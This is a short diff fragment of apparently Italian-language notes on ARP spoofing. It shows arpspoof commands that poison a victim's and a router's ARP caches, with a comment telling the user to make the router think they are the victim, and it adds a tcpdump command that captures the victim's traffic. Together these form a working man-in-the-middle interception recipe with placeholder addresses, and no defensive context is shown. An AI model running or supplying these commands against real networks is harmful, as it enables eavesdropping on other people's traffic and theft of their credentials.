@@ -28,3 +28,6 @@ arpspoof -i eth0 -t [IP_VITTIMA] [IP_ROUTER]
 
 # Dì al Router che TU sei la Vittima
 arpspoof -i eth0 -t [IP_ROUTER] [IP_VITTIMA]
+
+Wireshark/tcpdump:
+tcpdump -i eth0 host [IP_VITTIMA]
